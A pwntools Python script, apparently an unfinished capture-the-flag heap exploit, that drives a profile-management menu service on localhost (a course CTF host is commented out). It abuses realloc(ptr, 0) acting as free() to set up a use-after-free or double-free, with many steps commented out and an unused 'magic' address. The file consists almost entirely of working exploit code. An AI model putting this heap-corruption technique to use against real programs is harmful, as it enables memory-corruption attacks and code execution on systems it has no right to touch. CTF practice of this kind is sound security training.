# -*- coding: utf-8 -*- 
from pwn import *
from time import sleep
context.arch = 'amd64'

#可發現到 realloc(ptr,0) 會被當成 free(ptr)
#r = remote('csie.ctf.tw',10138)
r = remote('localhost',8888)

#r.interactive()
size = '64'
content = 'faceb00c'
magic = 0x400c23
def add_profile(name,age,len_desc,desc):
    r.recvuntil(':')
    r.send('1')
    r.recvuntil(':')
    r.send(name)
    r.recvuntil(':')
    r.send(str(age))
    r.recvuntil(':')
    r.send(str(len_desc))
    r.recvuntil(':')
    r.send(desc)

def show_profile(idx):
    r.recvuntil(':')
    r.send('2')
    r.recvuntil(':')
    r.send(str(idx))
def edit_profile(idx,name,age,desc):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.send(str(idx))
    r.recvuntil(':')
    r.send(name)
    r.recvuntil(':')
    r.send(str(age))
    r.recvuntil(':')
    r.send(desc)
def realloc_errorr(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.send(str(idx))
    r.recvuntil(':')
    r.send('\x00')

def del_profile(idx):
    r.recvuntil(':')
    r.send('4')
    r.recvuntil(':')
    r.send(str(idx))

#add
add_profile('A'*16,18,0x98,'A'*(0x98-1) ) #0
add_profile('B'*16,18,0xa0,'B'*(0xa0-1) ) #0
realloc_errorr(1)
#realloc_errorr(0)
#realloc_errorr(1)
del_profile(1)
#del_profile(1)
#add_profile('C'*16,18,0xb0,'C'*(0xb0-1) ) #0
#
#realloc_errorr(0)
#add_profile('B'*8,18,0xa0,'B'*(0xa0-1) ) #0
#del_profile(0)
#add_profile('C'*8,18,0xa0,'C'*(0xa0-1) ) #0

#add_profile('kkkk',22,0xa0,'A'*(0xa0-1) ) #0



r.interactive()

